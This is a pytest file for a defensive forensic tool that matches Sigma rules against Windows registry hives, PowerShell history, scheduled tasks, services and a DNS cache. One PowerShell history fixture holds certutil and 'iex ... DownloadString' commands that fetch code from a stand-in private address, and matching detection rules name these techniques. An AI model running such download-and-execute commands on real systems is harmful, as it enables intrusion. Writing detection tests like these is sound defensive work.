    (s,) = _by(rows, "Evil Service")
    assert s["match"] == ("TargetObject=HKLM\\SYSTEM\\CurrentControlSet\\Services\\EvilSvc"
                          "\\ImagePath Details=C:\\evil.exe")
    (u,) = _by(rows, "Evil Run")
    assert u["match"] == ("TargetObject=HKU\\USER\\Software\\Microsoft\\Windows\\CurrentVersion"
                          "\\Run\\Updater Details=C:\\Users\\jdoe\\evil.exe")
    assert u["first_seen"] == "2026-01-07 09:30:00"       # the key's last write
    (d,) = _by(rows, "Debug Enabled")                      # a DWORD as Sysmon writes it
    assert d["match"].endswith("Details=DWORD (0x00000001)")


def test_a_dword_that_differs_does_not_match(tmp_path, monkeypatch):
    _hives(tmp_path, monkeypatch, {"Windows/System32/config/SYSTEM": _system(debug=0)})
    assert _by(_run(tmp_path), "Debug Enabled") == []


def test_with_the_hives_read_the_registry_tables_are_not_counted_again(tmp_path, monkeypatch):
    _hives(tmp_path, monkeypatch, {"Users/jdoe/NTUSER.DAT": _ntuser()})
    _write(_csvs(tmp_path) / "Registry" / "art_reg_users.csv", _REG, [
        ["NTUSER", r"C:\x\Users\jdoe\NTUSER.DAT",
         r"ROOT\Software\Microsoft\Windows\CurrentVersion\Run", "Updater", "RegSz",
         r"C:\evil.exe", "2026-01-05 10:00:00"]])
    (u,) = _by(_run(tmp_path), "Evil Run")
    assert u["count"] == "1"


def test_value_details_follow_sysmon():
    assert W._value_details(_V("a", 11, 2**40)) == "QWORD (0x0000010000000000)"
    assert W._value_details(_V("a", 4, -1)) == "DWORD (0xffffffff)"
    assert W._value_details(_V("a", 3, b"\x01\x02")) == "Binary Data"
    assert W._value_details(_V("a", 7, ["one", "", "two"])) == "one two"
    assert W._value_details(_V("a", 1, "")) is None


def _fork_files(tmp_path, not_adaptable: str = "", baseline: str = "") -> Path:
    """assets/sigma_disk with the fork's aeng/ files (and no rule of its own)."""
    assets = _assets(tmp_path)
    aeng = assets / "sigma_disk" / "aeng"
    aeng.mkdir(parents=True, exist_ok=True)
    (aeng / "not-adaptable.txt").write_text(not_adaptable, encoding="utf-8")
    (aeng / "registry_baseline.tsv").write_text(baseline, encoding="utf-8")
    return assets


def test_a_value_as_a_clean_install_ships_it_is_not_evidence(tmp_path, monkeypatch):
    # Over a hive's state a rule for "this value was set" fires on Windows' own
    # default; the fork's baseline of clean-install values takes those out first.
    _hives(tmp_path, monkeypatch, {"Windows/System32/config/SYSTEM": _system(debug=1)})
    assets = _fork_files(tmp_path, baseline=(
        "# comment\n"
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EvilSvc\\Debug\tDWORD (0x00000001)\n"
        "hklm\\system\\currentcontrolset\\services\\evilsvc\\imagepath\tC:\\other.exe\n"))
    rows = _run(tmp_path, assets=assets)
    assert _by(rows, "Debug Enabled") == []          # same key, same data: dropped
    (s,) = _by(rows, "Evil Service")                 # same key, other data: kept
    assert s["match"].endswith("Details=C:\\evil.exe")


def test_a_rule_the_fork_lists_as_not_adaptable_is_not_run(tmp_path, monkeypatch):
    _hives(tmp_path, monkeypatch, {"Windows/System32/config/SYSTEM": _system()})
    assets = _fork_files(tmp_path, not_adaptable=(
        f"# id  path  reason\n{_id('Debug Enabled')}  rules/x.yml  state noise\n"))
    rows = _run(tmp_path, assets=assets)
    assert _by(rows, "Debug Enabled") == []
    assert _by(rows, "Evil Service")


def test_a_connection_is_named_from_the_live_dns_cache(tmp_path):
    # netstat gives the address only; the live response's DNS cache says which name
    # it was looked up as -- the alias the program asked for, not the CDN's name.
    custom = tmp_path / "assets" / "sigma_custom" / "windows" / "network_connection"
    custom.mkdir(parents=True, exist_ok=True)
    (custom / "z.yml").write_text(_rule("Tunnel Host", "network_connection",
                                        {"DestinationHostname|endswith": ".tunnel.example.local"}),
                                  encoding="utf-8")
    res = tmp_path / "C" / "Velociraptor" / "LiveResponse" / "results"
    res.mkdir(parents=True)
    cache = [{"Name": "api.tunnel.example.local", "Record": "edge.cdn.example.local",
              "_RecordType": "CNAME"},
             {"Name": "edge.cdn.example.local", "Record": "10.0.0.5", "_RecordType": "A"},
             {"Name": "other.example.local", "Record": "10.0.0.6", "_RecordType": "A"}]
    (res / "Eiffel.LiveResponse.Windows%2FWindows.System.DNSCache.json").write_text(
        "\n".join(json.dumps(x) for x in cache), encoding="utf-8")
    hdr = ["pid", "process", "path", "user", "state", "proto", "local_ip", "local_port",
           "remote_ip", "remote_port", "socket_created_utc", "start_utc"]
    _write(_csvs(tmp_path) / "Network" / "art_process_network.csv", hdr, [
        ["100", "evil.exe", r"C:\Tools\evil.exe", "jdoe", "ESTABLISHED", "tcp", "10.0.0.9",
         "50000", "10.0.0.5", "443", "2026-01-07 01:00:00", ""],
        ["101", "app.exe", r"C:\Tools\app.exe", "jdoe", "ESTABLISHED", "tcp", "10.0.0.9",
         "50001", "10.0.0.7", "443", "2026-01-07 01:00:00", ""]])
    (t,) = _by(_run(tmp_path), "Tunnel Host")
    assert t["count"] == "1"
    assert "DestinationHostname=api.tunnel.example.local" in t["match"]


def test_a_snapshot_volume_takes_no_name_from_the_live_cache(tmp_path):
    res = tmp_path / "C" / "Velociraptor" / "LiveResponse" / "results"
    res.mkdir(parents=True)
    (res / "Eiffel.LiveResponse.Windows%2FWindows.System.DNSCache.json").write_text(
        json.dumps({"Name": "a.example.local", "Record": "10.0.0.5", "_RecordType": "A"}),
        encoding="utf-8")
    ctx = _ctx(tmp_path)
    assert W._dns_names(ctx) == {"10.0.0.5": "a.example.local"}
    ctx.volume = "VSS1"
    assert W._dns_names(ctx) == {}


# ---- saved command lines as processes (v0.7.197) -----------------------------------

def _cmd_rules(tmp_path):
    custom = tmp_path / "assets" / "sigma_custom" / "windows" / "process_creation"
    custom.mkdir(parents=True, exist_ok=True)
    (custom / "c1.yml").write_text(_rule("Certutil Download", "process_creation", {
        "Image|endswith": "\\certutil.exe", "CommandLine|contains": "urlcache"}),
        encoding="utf-8")
    (custom / "c2.yml").write_text(_rule("Web Cradle", "process_creation", {
        "Image|endswith": "\\powershell.exe", "CommandLine|contains": "DownloadString"}),
        encoding="utf-8")
    (custom / "c3.yml").write_text(_rule("From PowerShell", "process_creation", {
        "ParentImage|endswith": "\\powershell.exe", "Image|endswith": "\\whoami.exe"}),
        encoding="utf-8")


def test_the_saved_command_lines_run_as_processes(tmp_path):
    # The PowerShell history, the scheduled tasks and the service ImagePaths say
    # which command lines the host ran; the process rules read them as processes.
    _cmd_rules(tmp_path)
    hist = (tmp_path / "C" / "Users" / "jdoe" / "AppData" / "Roaming" / "Microsoft"
            / "Windows" / "PowerShell" / "PSReadLine" / "ConsoleHost_history.txt")
    hist.parent.mkdir(parents=True)
    hist.write_text("certutil -urlcache -f http://10.0.0.5/a.txt a.exe\n"
                    "iex (New-Object Net.WebClient).DownloadString('http://10.0.0.5/b')\n"
                    "whoami /all\n", encoding="utf-8")
    _write(_csvs(tmp_path) / "Persistence" / "art_tasks.csv", ["task", "runas", "command"],
           [["\\Sync", "SYSTEM", "\"C:\\Users\\jdoe\\AppData\\evil.exe\" -x"]])
    _write(_csvs(tmp_path) / "Registry" / "art_reg_services.csv",
           ["KeyPath", "ValueName", "ValueData", "LastWriteTimestamp"],
           [["ControlSet001\\Services\\Upd", "ImagePath",
             "C:\\ProgramData\\Upd\\evil.exe -service", "2026-01-08 10:00:00"]])
    rows = _run(tmp_path)
    (c,) = _by(rows, "Certutil Download")
    assert c["source"] == "powershell_history"
    assert c["match"].startswith("Image=\\certutil.exe CommandLine=certutil -urlcache")
    (w,) = _by(rows, "Web Cradle")          # an expression runs in powershell.exe itself
    assert w["source"] == "powershell_history"
    assert _by(rows, "From PowerShell")     # an external program's parent is the shell
    sources = {r["source"] for r in _by(rows, "Evil Image")}
    assert {"task", "service"} <= sources


def test_a_saved_command_names_the_program_it_starts():
    ps = W._POWERSHELL
    assert W._image_of("Get-ChildItem C:\\x", True) == ps
    assert W._image_of("ls", True) == ps                       # an alias
    assert W._image_of("$a = 1", True) == ps
    assert W._image_of("certutil.exe -decode a b", True) == "\\certutil.exe"
    assert W._image_of("ping 10.0.0.5", True) == "\\ping.exe"
    assert W._image_of('"C:\\Program Files\\App\\a.exe" -x', False) == \
        "C:\\Program Files\\App\\a.exe"
    assert W._image_of("C:\\Program Files\\App\\a.exe -x", False) == \
        "C:\\Program Files\\App\\a.exe"
    assert W._image_of("ls", False) == "\\ls.exe"              # not a shell: a program


def test_a_saved_commands_leading_path_is_expanded_as_windows_runs_it():
    # A service's ImagePath says %SystemRoot%\system32\svchost.exe; Sysmon, and the
    # rules, see C:\Windows\system32\svchost.exe. Unexpanded, every service was a
    # "system file outside System32".
    e = W._expanded
    assert e("%SystemRoot%\\system32\\svchost.exe -k x") == "C:\\Windows\\system32\\svchost.exe -k x"
    assert e("%windir%\\system32\\wermgr.exe -upload") == "C:\\Windows\\system32\\wermgr.exe -upload"
    assert e("\\SystemRoot\\System32\\drivers\\a.sys") == "C:\\Windows\\System32\\drivers\\a.sys"
    assert e("system32\\DRIVERS\\b.sys") == "C:\\Windows\\system32\\DRIVERS\\b.sys"
    assert e('"%ProgramFiles%\\A\\b.exe" -x') == '"C:\\Program Files\\A\\b.exe" -x'
    assert e("%ProgramFiles(x86)%\\Z\\z.exe") == "C:\\Program Files (x86)\\Z\\z.exe"
    assert e("%ProgramData%\\M\\NisSrv.exe") == "C:\\ProgramData\\M\\NisSrv.exe"
    assert e("\\??\\C:\\x\\c.sys") == "C:\\x\\c.sys"
    assert e("C:\\keep.exe %windir%") == "C:\\keep.exe %windir%"   # only the leading path


def test_a_bare_name_is_found_where_windows_finds_it(tmp_path):
    # System32 is first on the PATH: a bare rundll32 the volume's System32 holds ran
    # from there; a name it does not hold keeps no folder; a script runs in its host.
    sys32 = tmp_path / "Windows" / "System32"
    sys32.mkdir(parents=True)
    (sys32 / "rundll32.exe").write_bytes(b"MZ")
    assert W._resolved("\\rundll32.exe", sys32) == "C:\\Windows\\System32\\rundll32.exe"
    assert W._resolved("\\tool.exe", sys32) == "\\tool.exe"
    assert W._resolved("\\rundll32.exe", None) == "\\rundll32.exe"
    assert W._resolved("C:\\Windows\\system32\\a.vbs", None) == \
        "C:\\Windows\\System32\\wscript.exe"
    assert W._resolved("C:\\Tools\\run.cmd", None) == "C:\\Windows\\System32\\cmd.exe"
    assert W._resolved("C:\\Tools\\a.exe", sys32) == "C:\\Tools\\a.exe"


def test_a_bare_name_a_clean_system32_holds_resolves_without_the_file(tmp_path):
    # A collection rarely holds System32's programs: the fork's list of a clean
    # install's System32 names says where a bare rundll32 ran from.
    assets = _fork_files(tmp_path)
    (assets / "sigma_disk" / "aeng" / "system32_names.txt").write_text(
        "# header\nrundll32.exe\n", encoding="utf-8")
    names = W._system32_names(assets / "sigma_disk")
    assert names == frozenset({"rundll32.exe"})
    assert W._resolved("\\RunDll32.exe", None, names) == "C:\\Windows\\System32\\RunDll32.exe"
    assert W._resolved("\\tool.exe", None, names) == "\\tool.exe"
    assert W._resolved("\\powershell.exe", None, names) == W._POWERSHELL
